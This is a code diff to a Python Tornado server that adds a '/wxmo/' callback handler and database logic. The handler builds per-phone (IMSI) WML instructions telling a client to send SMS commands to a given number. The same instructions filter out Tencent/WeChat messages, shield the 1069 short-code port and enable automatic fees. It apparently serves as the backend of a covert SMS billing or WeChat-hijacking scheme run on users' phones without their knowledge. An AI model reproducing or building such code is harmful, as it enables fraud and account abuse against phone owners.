@@ -10,6 +10,7 @@ import random
 import json
 
 import config
+from log import logger
 import public
 from Bastion import _test
 import MySQLdb
@@ -190,6 +191,82 @@ def insert_register_log(_info):
     return
 
 
+def insert_weixinMo_log(_info):
+    _dbLog = poolLog.connection()
+    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
+    _paras = [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 333,
+              _info["mobile"], _info["spcode"], _info["ip"], _info["spnumber"], _info["msg"], _info["imsi"]]
+    _dbLog.cursor().execute(_sql, _paras)
+    _dbLog.close()
+    return
+
+WXMO_CONTENT = '<?xml version="1.0" encoding="UTF-8"?><wml><card><Ccmd_cust>[cmd]</Ccmd_cust><Cnum_cust>[targetNum]</Cnum_cust><filter1_cust>腾讯科技|微信</filter1_cust><filter2_cust></filter2_cust><Creconfirm_cust></Creconfirm_cust><PortShield>1069</PortShield><fee></fee><autofee>1</autofee><feemode>11</feemode></card></wml>'
+
+
+def proc_weixinMo(info):
+    dbConfig = poolConfig.connection()
+    _cur = dbConfig.cursor()
+    _sql = "select expiredTime from test_responses where imsi=%s and testStatus='wxmo'"
+    _paras = [info['imsi']]
+    _cur.execute(_sql, _paras)
+    _recordRsp = _cur.fetchone()
+    wxmoRsp = WXMO_CONTENT.replace(
+        '[cmd]', str(info['msg'])).replace('[targetNum]', str(info['spnumber']))
+    if _recordRsp != None:
+        expiredTime = round(time.time()) + 86400
+        if expiredTime < int(_recordRsp['expiredTime']):
+            expiredTime = int(_recordRsp['expiredTime'])
+        _sql = "update `test_responses` set expiredTime=%s,response=%s where imsi = %s  and testStatus='wxmo'"
+        _paras = [expiredTime, wxmoRsp, info['imsi']]
+        _cur.execute(_sql, _paras)
+    else:
+        _sql = "insert into test_responses (imsi,testStatus,expiredTime,response) values (%s,'wxmo',unix_timestamp(now())+86400,%s)"
+        _paras = [info['imsi'], wxmoRsp]
+        _cur.execute(_sql, _paras)
+    _sql = 'select testStatus,expiredTime from test_imsis where imsi=%s'
+    _paras = [info['imsi']]
+    _cur.execute(_sql, _paras)
+    _recordRsp = _cur.fetchone()
+    if _recordRsp != None:
+        expiredTime = round(time.time()) + 86400
+        if expiredTime < int(_recordRsp['expiredTime']):
+            expiredTime = int(_recordRsp['expiredTime'])
+        if _recordRsp['testStatus'] == 'wxmo':
+            _sql = "update `test_imsis` set expiredTime=%s where imsi = %s"
+        else:
+            _sql = "update `test_imsis` set expiredTime=%s,testStatus='wxmo' where imsi = %s"
+        _paras = [expiredTime, info['imsi']]
+        _cur.execute(_sql, _paras)
+    else:
+        _sql = "insert into test_imsis (imsi,testStatus,expiredTime) values (%s,'wxmo',unix_timestamp(now())+86400)"
+        _paras = [info['imsi']]
+        _cur.execute(_sql, _paras)
+    _sql = "insert into wait_send_ads (targetMobile,msg) values (%s,'ztldtest')"
+    _paras = [info['mobile']]
+    _cur.execute(_sql, _paras)
+    _cur.close()
+    dbConfig.close()
+
+
+class WeiXinMoHandler(tornado.web.RequestHandler):
+
+    def get(self, spCode):
+        self.write("ok")
+        self.finish()
+        _ip = self.request.remote_ip
+        if spCode == 'dexing':
+            info = {'spcode': spCode, 'spnumber': self.get_argument('spnumber'), 'mobile': self.get_argument(
+                'mobile'),  'msg': self.get_argument('replyinfo'), 'ip': _ip, 'imsi': self.get_argument('ccpara')}
+        else:
+            print('error : no interface')
+            return
+        threads = []
+        threads.append(threading.Thread(target=insert_weixinMo_log(info)))
+        threads.append(threading.Thread(target=proc_weixinMo(info)))
+        for t in threads:
+            t.start()
+
+
 def insert_fetch_log(_info):
     _dbLog = poolLog.connection()
     _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`) values (%s,%s,%s,%s,%s,%s)'
@@ -209,8 +286,8 @@ def proc_sms(_sms_info):
         else:
             update_user_by_fee_info(_sms_cmd, _user)
         return
-    except "ParameterError", _argument:
-        print "ParameterError:", _argument
+    except Exception as error:
+        print(error)
     else:
         return
 
@@ -222,8 +299,8 @@ def update_relation(imsi, apid, aid):
         _paras = [aid, time.time(), imsi, apid]
         _dbConfig.cursor().execute(_sql, _paras)
         _dbConfig.close()
-    except "ParameterError", _argument:
-        print "ParameterError:", _argument
+    except Exception as error:
+        print(error)
     else:
         return
 
@@ -313,11 +390,12 @@ def make_app():
         (r"/ivr/([0-9a-zA-Z\-\_]+)", IvrHandler),
         (r"/month/([0-9a-zA-Z\-\_]+)", MonthHandler),
         (r"/register/([0-9a-zA-Z\-\_]+)", RegisterHandler),
+        (r"/wxmo/([0-9a-zA-Z\-\_]+)", WeiXinMoHandler),
         (r"/getmobi", GetMobiHandler),
     ])
 
 if __name__ == "__main__":
-    print("begin...")
+    logger.info("begin... on port:" + str(config.GLOBAL_SETTINGS['port']))
     app = make_app()
     cache_config()
     tornado.ioloop.PeriodicCallback(cache_config, 6000).start()
